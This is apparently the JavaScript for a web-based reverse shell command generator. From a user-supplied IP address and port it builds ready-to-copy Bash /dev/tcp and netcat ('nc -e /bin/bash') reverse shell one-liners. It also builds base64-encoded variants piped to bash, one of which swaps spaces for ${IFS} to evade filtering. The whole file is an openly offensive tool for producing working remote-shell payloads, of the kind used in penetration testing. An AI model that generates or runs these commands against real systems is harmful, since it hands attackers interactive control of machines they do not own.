document.addEventListener('DOMContentLoaded', () => {
    const ipAddressInput = document.getElementById('ipAddress');
    const portInput = document.getElementById('port');
    const generatedCommandsContainer = document.getElementById('generatedCommands');

    // Load saved values from local storage
    const savedIp = localStorage.getItem('reverseShellIp');
    const savedPort = localStorage.getItem('reverseShellPort');

    if (savedIp) {
        ipAddressInput.value = savedIp;
    }
    if (savedPort) {
        portInput.value = savedPort;
    }

    const shellCommands = [
        { type: 'bash', name: 'Bash TCP' },
        { type: 'nc', name: 'Netcat' },
        { type: 'bash_base64', name: 'Bash TCP (Base64)' },
        { type: 'bash_base64_no_spaces', name: 'Bash TCP (Base64 No Spaces)' }
    ];

    const typeText = (element, text, speed = 10) => {
        let i = 0;
        element.value = '';
        const timer = setInterval(() => {
            if (i < text.length) {
                element.value += text.charAt(i);
                i++;
            } else {
                clearInterval(timer);
            }
        }, speed);
    };

    const generateAllShellCommands = () => {
        const ip = ipAddressInput.value.trim();
        const port = portInput.value.trim();

        // Save values to local storage
        localStorage.setItem('reverseShellIp', ip);
        localStorage.setItem('reverseShellPort', port);

        generatedCommandsContainer.innerHTML = ''; // Clear previous commands

        if (!ip || !port) {
            generatedCommandsContainer.innerHTML = '<p class="text-red-400">Please enter both IP address and port.</p>';
            return;
        }

        if (!/^\d{1,5}$/.test(port) || parseInt(port) > 65535) {
            generatedCommandsContainer.innerHTML = '<p class="text-red-400">Please enter a valid port number (1-65535).</p>';
            return;
        }

        shellCommands.forEach(shell => {
            let command = '';
            switch (shell.type) {
                case 'bash':
                    command = `/bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                    break;
                case 'nc':
                    command = `nc -e /bin/bash ${ip} ${port}`;
                    break;
                case 'bash_base64':
                    const bashCommand = `/bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                    command = `echo ${btoa(bashCommand)}|base64 -d|bash`;
                    break;
                case 'bash_base64_no_spaces':
                    const bashCmdNoSpaces = `/bin/bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                    command = `echo ${btoa(bashCmdNoSpaces)}|base64 -d|bash`.replace(/ /g, '${IFS}');
                    break;
            }

            const commandDiv = document.createElement('div');
            commandDiv.className = 'bg-gray-800 bg-opacity-75 p-4 relative border border-green-500';
            const textareaId = `command-${shell.type}`;
            commandDiv.innerHTML = `
                <label class="block text-sm font-bold mb-2 text-green-400">${shell.name}:</label>
                <textarea id="${textareaId}" rows="3" readonly class="shadow appearance-none border border-green-700 w-full py-2 px-3 text-green-200 bg-black leading-tight focus:outline-none focus:shadow-outline font-mono text-sm"></textarea>
                <button class="copy-btn absolute top-4 right-4 text-gray-400 hover:text-white">
                    <svg class="copy-icon w-6 h-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                    </svg>
                    <svg class="check-icon w-6 h-6 text-green-500 hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 12.75l6 6 9-13.5" />
                    </svg>
                </button>
            `;
            generatedCommandsContainer.appendChild(commandDiv);
            const textarea = document.getElementById(textareaId);
            typeText(textarea, command);
        });

        document.querySelectorAll('.copy-btn').forEach(button => {
            const copyIcon = button.querySelector('.copy-icon');
            const checkIcon = button.querySelector('.check-icon');

            button.addEventListener('click', (event) => {
                const textarea = event.currentTarget.previousElementSibling;
                textarea.select();
                textarea.setSelectionRange(0, 99999); // For mobile devices

                try {
                    document.execCommand('copy');
                    copyIcon.classList.add('hidden');
                    checkIcon.classList.remove('hidden');

                    setTimeout(() => {
                        copyIcon.classList.remove('hidden');
                        checkIcon.classList.add('hidden');
                    }, 2000);
                } catch (err) {
                    console.error('Failed to copy: ', err);
                }
            });
        });
    };

    ipAddressInput.addEventListener('input', generateAllShellCommands);
    portInput.addEventListener('input', generateAllShellCommands);

    // Initial generation
    generateAllShellCommands();
});
